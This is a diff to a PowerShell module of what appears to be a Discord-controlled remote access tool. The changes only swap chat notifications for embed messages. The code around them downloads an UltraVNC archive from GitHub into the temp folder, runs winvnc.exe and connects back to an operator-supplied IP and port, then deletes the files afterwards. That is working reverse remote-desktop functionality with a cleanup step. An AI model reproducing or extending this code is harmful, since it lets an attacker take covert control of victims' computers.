@@ -1,8 +1,8 @@
 #ENABLEUVNC
 Function MStartUvnc {
     param([string]$ip,[string]$port)
-    sendMsg -Message "Set up UVNC Lister, IP: $ip, Port: $port"
-    sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
+    sendEmbedWithImage -Title "UVNC Client Downloading" -Description "UVNC client listener should be running and attempting to connect to $ip on port $port."
+
     $tempFolder = "$env:temp\vnc"
     $vncDownload = "https://github.com/JoshuaBrien/Compilation-of-stuff-i-done/raw/refs/heads/main/Coral_network_discordONLY/assets/UltraVNC.zip"
     $vncZip = "$tempFolder\UltraVNC.zip" 
@@ -17,13 +17,14 @@ Function MStartUvnc {
     Start-Sleep 1 
     rm -Path $vncZip -Force  
     $proc = "$tempFolder\winvnc.exe"
+    sendEmbedWithImage -Title "UVNC Client Downloaded" -Description "UVNC client downloaded"
     Start-Process $proc -ArgumentList ("-run")
     Start-Sleep 2
     Start-Process $proc -ArgumentList ("-connect $ip::$port")
 }
 #DISABLEUVNC
 Function MRemoveUVNC {
-    sendMsg -Message ":wastebasket: ``Removing UVNC files...`` :wastebasket:"
+    sendEmbedWithImage -Title "Removing UVNC Client" -Description "Cleaning up UVNC client files..."
     $tempFolder = "$env:temp\vnc"
     if (Test-Path -Path $tempFolder) {
         rm -Path $tempFolder -Force 
